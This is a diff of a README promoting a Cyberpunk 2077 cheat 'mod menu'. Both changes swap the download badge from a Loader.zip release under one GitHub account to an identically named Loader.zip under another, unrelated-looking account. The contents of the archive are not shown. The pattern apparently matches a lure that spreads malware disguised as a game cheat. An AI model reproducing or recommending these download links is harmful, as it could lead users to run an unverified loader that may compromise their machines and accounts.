@@ -41,7 +41,7 @@ But Cyberpunk 2077 is **brutal**. The **Eddie grind** is endless. The **cyberwar
 
 ## 🔗 Download
 
-[![Download Cyberpunk 2077 Mod Menu 2026](https://img.shields.io/badge/DOWNLOAD-HERE-FFD700?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Cyberpunk 2077 Mod Menu 2026](https://img.shields.io/badge/DOWNLOAD-HERE-FFD700?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
@@ -241,7 +241,7 @@ The cheat ships with a full-featured config system — every setting can be save
 
 ## 📥 Download Cyberpunk 2077 Mod Menu 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-FFD700?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-FFD700?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
